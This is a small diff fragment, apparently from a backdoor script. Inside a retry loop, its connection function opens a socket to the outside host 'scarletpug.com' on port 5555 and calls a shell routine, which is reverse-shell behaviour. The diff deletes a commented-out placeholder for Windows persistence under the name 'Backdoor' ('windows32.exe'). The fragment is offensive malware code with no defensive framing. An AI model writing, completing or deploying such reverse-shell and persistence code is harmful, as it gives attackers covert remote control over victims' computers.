@@ -295,8 +295,7 @@ def connection():
         time.sleep(1)
         try:
             s.connect(('scarletpug.com', 5555))
-            # if platform == 'win32':       #TO BE DONE
-            #     persist('Backdoor', 'windows32.exe')
+
             shell()
             s.close()
             break
